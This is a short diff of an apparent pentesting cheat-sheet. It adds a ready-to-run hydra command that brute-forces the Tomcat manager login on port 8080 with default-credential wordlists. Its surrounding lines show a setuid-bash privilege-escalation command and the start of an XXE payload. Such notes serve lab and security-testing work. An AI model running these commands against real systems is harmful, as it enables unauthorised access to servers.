@@ -179,7 +179,15 @@ chmod +s /bin/bash
 #### Setting up PHP server
 > 1. To execute a PHP script file, in command line simply type -> php <file name.php>
 > 1. to start a php based webserver, simply type -> php -S localhost:8000
-  
+ 
+#### Tomocat 8080 bruteforcing
+	
+```bash hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/seclists/Passwords/Default-Credentials/tomcat-betterdefaultpasslist.txt -I -u -f 192.168.10.7 -s 8080 http-get /manager/html -V -F```
+	
+
+
+	
+	
 #### XXE injection
 ```bash
 <?xml  version="1.0" encoding="ISO-8859-1"?>
